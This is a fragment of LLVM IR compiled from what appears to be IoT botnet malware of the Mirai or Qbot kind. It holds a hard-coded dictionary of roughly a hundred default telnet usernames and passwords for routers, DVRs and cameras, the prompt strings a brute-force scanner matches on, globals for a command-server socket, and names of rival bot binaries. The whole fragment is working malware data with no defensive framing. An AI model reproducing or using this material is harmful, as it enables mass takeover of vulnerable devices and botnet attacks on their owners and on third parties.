@.str.125 = private unnamed_addr constant [7 x i8] c"ZEuS69\00", align 1
@.str.126 = private unnamed_addr constant [11 x i8] c"s4beBsEQhd\00", align 1
@.str.127 = private unnamed_addr constant [11 x i8] c"HOHO-KSNDO\00", align 1
@.str.128 = private unnamed_addr constant [7 x i8] c"ZEuz69\00", align 1
@.str.129 = private unnamed_addr constant [8 x i8] c"sat1234\00", align 1
@.str.130 = private unnamed_addr constant [9 x i8] c"aj93hJ23\00", align 1
@.str.131 = private unnamed_addr constant [7 x i8] c"scanHA\00", align 1
@.str.132 = private unnamed_addr constant [13 x i8] c"alie293z0k2L\00", align 1
@.str.133 = private unnamed_addr constant [13 x i8] c"scanJoshoARM\00", align 1
@.str.134 = private unnamed_addr constant [11 x i8] c"HellInSide\00", align 1
@.str.135 = private unnamed_addr constant [13 x i8] c"ayyyGangShit\00", align 1
@.str.136 = private unnamed_addr constant [14 x i8] c"scanJoshoARM5\00", align 1
@.str.137 = private unnamed_addr constant [8 x i8] c"HighFry\00", align 1
@.str.138 = private unnamed_addr constant [5 x i8] c"b1gl\00", align 1
@.str.139 = private unnamed_addr constant [14 x i8] c"scanJoshoARM6\00", align 1
@.str.140 = private unnamed_addr constant [11 x i8] c"IWhPyucDbJ\00", align 1
@.str.141 = private unnamed_addr constant [9 x i8] c"boatnetz\00", align 1
@.str.142 = private unnamed_addr constant [14 x i8] c"scanJoshoARM7\00", align 1
@.str.143 = private unnamed_addr constant [11 x i8] c"IuYgujeIqn\00", align 1
@.str.144 = private unnamed_addr constant [10 x i8] c"btbatrtah\00", align 1
@.str.145 = private unnamed_addr constant [14 x i8] c"scanJoshoM68K\00", align 1
@.str.146 = private unnamed_addr constant [13 x i8] c"JJDUHEWBBBIB\00", align 1
@.str.147 = private unnamed_addr constant [2 x i8] c"c\00", align 1
@.str.148 = private unnamed_addr constant [14 x i8] c"scanJoshoMIPS\00", align 1
@.str.149 = private unnamed_addr constant [14 x i8] c"JSDGIEVIVAVIG\00", align 1
@.str.150 = private unnamed_addr constant [11 x i8] c"cKbVkzGOPa\00", align 1
@.str.151 = private unnamed_addr constant [14 x i8] c"scanJoshoMPSL\00", align 1
@.str.152 = private unnamed_addr constant [5 x i8] c"ccAD\00", align 1
@.str.153 = private unnamed_addr constant [13 x i8] c"scanJoshoPPC\00", align 1
@.str.154 = private unnamed_addr constant [12 x i8] c"KAZEN-OIU97\00", align 1
@.str.155 = private unnamed_addr constant [13 x i8] c"chickenxings\00", align 1
@.str.156 = private unnamed_addr constant [13 x i8] c"scanJoshoSH4\00", align 1
@.str.157 = private unnamed_addr constant [10 x i8] c"yakuskzm8\00", align 1
@.str.158 = private unnamed_addr constant [12 x i8] c"KAZEN-PO78H\00", align 1
@.str.159 = private unnamed_addr constant [8 x i8] c"cleaner\00", align 1
@.str.160 = private unnamed_addr constant [13 x i8] c"scanJoshoSPC\00", align 1
@.str.161 = private unnamed_addr constant [10 x i8] c"yakuv4vxc\00", align 1
@.str.162 = private unnamed_addr constant [12 x i8] c"KAZEN-U79OL\00", align 1
@.str.163 = private unnamed_addr constant [6 x i8] c"dbeef\00", align 1
@.str.164 = private unnamed_addr constant [13 x i8] c"scanJoshoX86\00", align 1
@.str.165 = private unnamed_addr constant [10 x i8] c"yakuz4c24\00", align 1
@.str.166 = private unnamed_addr constant [10 x i8] c"KETASHI32\00", align 1
@.str.167 = private unnamed_addr constant [10 x i8] c"ddrwelper\00", align 1
@.str.168 = private unnamed_addr constant [9 x i8] c"scanarm5\00", align 1
@.str.169 = private unnamed_addr constant [11 x i8] c"zPnr6HpQj2\00", align 1
@.str.170 = private unnamed_addr constant [13 x i8] c"Kaishi-Iz90Y\00", align 1
@.str.171 = private unnamed_addr constant [7 x i8] c"deexec\00", align 1
@.str.172 = private unnamed_addr constant [9 x i8] c"scanarm6\00", align 1
@.str.173 = private unnamed_addr constant [10 x i8] c"zdrtfxcgy\00", align 1
@.str.174 = private unnamed_addr constant [10 x i8] c"Katrina32\00", align 1
@.str.175 = private unnamed_addr constant [9 x i8] c"doCP3fVj\00", align 1
@.str.176 = private unnamed_addr constant [9 x i8] c"scanarm7\00", align 1
@.str.177 = private unnamed_addr constant [9 x i8] c"zxcfhuio\00", align 1
@.str.178 = private unnamed_addr constant [11 x i8] c"Ksif91je39\00", align 1
@.str.179 = private unnamed_addr constant [9 x i8] c"scanm68k\00", align 1
@.str.180 = private unnamed_addr constant [6 x i8] c"Kuasa\00", align 1
@.str.181 = private unnamed_addr constant [10 x i8] c"dvrpelper\00", align 1
@.str.182 = private unnamed_addr constant [9 x i8] c"scanmips\00", align 1
@.str.183 = private unnamed_addr constant [14 x i8] c"KuasaBinsMate\00", align 1
@.str.184 = private unnamed_addr constant [11 x i8] c"eQnOhRk85r\00", align 1
@.str.185 = private unnamed_addr constant [9 x i8] c"scanmpsl\00", align 1
@.str.186 = private unnamed_addr constant [14 x i8] c"LOLHHHOHOHBUI\00", align 1
@.str.187 = private unnamed_addr constant [11 x i8] c"eXK20CL12Z\00", align 1
@.str.188 = private unnamed_addr constant [8 x i8] c"scanppc\00", align 1
@mainCommSock = global i32 0, align 4
@actualparent = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i32 0, align 4
@macAddress = global [6 x i8] zeroinitializer, align 1
@usernames = global [99 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.195, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.192, i32 0, i32 0)], align 16
@.str.189 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.190 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.191 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.192 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.193 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.194 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.195 = private unnamed_addr constant [8 x i8] c"daemon\00\00", align 1
@.str.196 = private unnamed_addr constant [5 x i8] c"adm\00\00", align 1
@.str.197 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@.str.198 = private unnamed_addr constant [15 x i8] c"Administrator\00\00", align 1
@.str.199 = private unnamed_addr constant [8 x i8] c"mg3500\00\00", align 1
@.str.200 = private unnamed_addr constant [8 x i8] c"admin1\00\00", align 1
@.str.201 = private unnamed_addr constant [6 x i8] c"ubnt\00\00", align 1
@.str.202 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@passwords = global [98 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.205, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.212, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.214, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.215, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.216, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.217, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.218, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.219, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.220, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.221, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.222, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.224, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.225, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.226, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.228, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.231, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.232, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.233, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.234, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.218, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.236, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.237, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.238, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.239, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.225, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.237, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.221, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.220, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.240, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.234, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.233, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.232, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.231, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.228, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.241, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.206, i32 0, i32 0)], align 16
@.str.203 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@.str.204 = private unnamed_addr constant [8 x i8] c"Zte521\00\00", align 1
@.str.205 = private unnamed_addr constant [7 x i8] c"vizxv\00\00", align 1
@.str.206 = private unnamed_addr constant [8 x i8] c"000000\00\00", align 1
@.str.207 = private unnamed_addr constant [7 x i8] c"14567\00\00", align 1
@.str.208 = private unnamed_addr constant [8 x i8] c"hi3518\00\00", align 1
@.str.209 = private unnamed_addr constant [6 x i8] c"pass\00\00", align 1
@.str.210 = private unnamed_addr constant [9 x i8] c"admin14\00\00", align 1
@.str.211 = private unnamed_addr constant [14 x i8] c"7ujMko0admin\00\00", align 1
@.str.212 = private unnamed_addr constant [10 x i8] c"00000000\00\00", align 1
@.str.213 = private unnamed_addr constant [4 x i8] c"<>\00\00", align 1
@.str.214 = private unnamed_addr constant [6 x i8] c"klv1\00\00", align 1
@.str.215 = private unnamed_addr constant [7 x i8] c"klv14\00\00", align 1
@.str.216 = private unnamed_addr constant [10 x i8] c"oelinux1\00\00", align 1
@.str.217 = private unnamed_addr constant [9 x i8] c"realtek\00\00", align 1
@.str.218 = private unnamed_addr constant [6 x i8] c"1111\00\00", align 1
@.str.219 = private unnamed_addr constant [7 x i8] c"54321\00\00", align 1
@.str.220 = private unnamed_addr constant [8 x i8] c"antslq\00\00", align 1
@.str.221 = private unnamed_addr constant [9 x i8] c"zte9x15\00\00", align 1
@.str.222 = private unnamed_addr constant [8 x i8] c"system\00\00", align 1
@.str.223 = private unnamed_addr constant [6 x i8] c"1456\00\00", align 1
@.str.224 = private unnamed_addr constant [8 x i8] c"888888\00\00", align 1
@.str.225 = private unnamed_addr constant [6 x i8] c"ikwb\00\00", align 1
@.str.226 = private unnamed_addr constant [10 x i8] c"juantech\00\00", align 1
@.str.227 = private unnamed_addr constant [8 x i8] c"xc3511\00\00", align 1
@.str.228 = private unnamed_addr constant [9 x i8] c"1111111\00\00", align 1
@.str.229 = private unnamed_addr constant [9 x i8] c"service\00\00", align 1
@.str.230 = private unnamed_addr constant [5 x i8] c"145\00\00", align 1
@.str.231 = private unnamed_addr constant [6 x i8] c"4321\00\00", align 1
@.str.232 = private unnamed_addr constant [6 x i8] c"tech\00\00", align 1
@.str.233 = private unnamed_addr constant [6 x i8] c"abc1\00\00", align 1
@.str.234 = private unnamed_addr constant [8 x i8] c"switch\00\00", align 1
@.str.235 = private unnamed_addr constant [8 x i8] c"meinsm\00\00", align 1
@.str.236 = private unnamed_addr constant [10 x i8] c"smcadmin\00\00", align 1
@.str.237 = private unnamed_addr constant [10 x i8] c"14567890\00\00", align 1
@.str.238 = private unnamed_addr constant [4 x i8] c"14\00\00", align 1
@.str.239 = private unnamed_addr constant [6 x i8] c"anko\00\00", align 1
@.str.240 = private unnamed_addr constant [8 x i8] c"merlin\00\00", align 1
@.str.241 = private unnamed_addr constant [7 x i8] c"zlxx.\00\00", align 1
@scanPid = global i32 0, align 4
@advances = global [7 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.242, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.243, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.244, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.245, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.246, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.247, i32 0, i32 0), i8* null], align 16
@.str.242 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.243 = private unnamed_addr constant [4 x i8] c"ser\00", align 1
@.str.244 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.245 = private unnamed_addr constant [5 x i8] c"name\00", align 1
@.str.246 = private unnamed_addr constant [5 x i8] c"pass\00", align 1
@.str.247 = private unnamed_addr constant [7 x i8] c"dvrdvs\00", align 1
@fails = global [9 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.248, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.249, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.250, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.251, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.252, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.253, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.254, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.255, i32 0, i32 0), i8* null], align 16
@.str.248 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.249 = private unnamed_addr constant [6 x i8] c"ailed\00", align 1
@.str.250 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.251 = private unnamed_addr constant [6 x i8] c"enied\00", align 1
@.str.252 = private unnamed_addr constant [6 x i8] c"error\00", align 1
@.str.253 = private unnamed_addr constant [8 x i8] c"goodbye\00", align 1
@.str.254 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@.str.255 = private unnamed_addr constant [8 x i8] c"timeout\00", align 1
@successes = global [8 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.256, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.257, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.258, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.259, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.260, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.247, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.261, i32 0, i32 0), i8* null], align 16
@.str.256 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.257 = private unnamed_addr constant [2 x i8] c"#\00", align 1
